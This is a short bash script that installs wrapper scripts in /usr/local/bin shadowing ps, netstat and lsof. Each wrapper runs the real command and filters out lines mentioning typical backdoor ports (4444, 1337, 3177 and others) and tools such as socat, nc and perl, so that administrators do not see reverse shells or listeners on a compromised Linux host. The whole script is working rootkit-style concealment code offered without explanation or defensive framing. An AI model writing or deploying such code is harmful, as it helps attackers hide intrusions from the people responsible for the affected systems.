#!/bin/bash

#ps
#------------------------
touch /usr/local/bin/ps

cat <<EOF >> /usr/local/bin/ps	
#!/bin/bash
/bin/ps \$@ | grep -Ev '4444|3177|1177|1337|19526|socat|LEGO|nc|perl'
EOF

chmod +x /usr/local/bin/ps

#netstat
#------------------------
touch /usr/local/bin/netstat

cat <<EOF >> /usr/local/bin/netstat
#!/bin/bash
/bin/netstat \$@ | grep -Ev '4444|3177|1177|1337|19526|socat|LEGO|nc|perl'
EOF

chmod +x /usr/local/bin/netstat

#lsof
#------------------------
touch /usr/local/bin/lsof

cat <<EOF >> /usr/local/bin/lsof
#!/bin/bash
/usr/bin/lsof \$@ | grep -Ev '4444|3177|1177|1337|19526|socat|LEGO|nc|perl'
EOF

chmod +x /usr/local/bin/lsof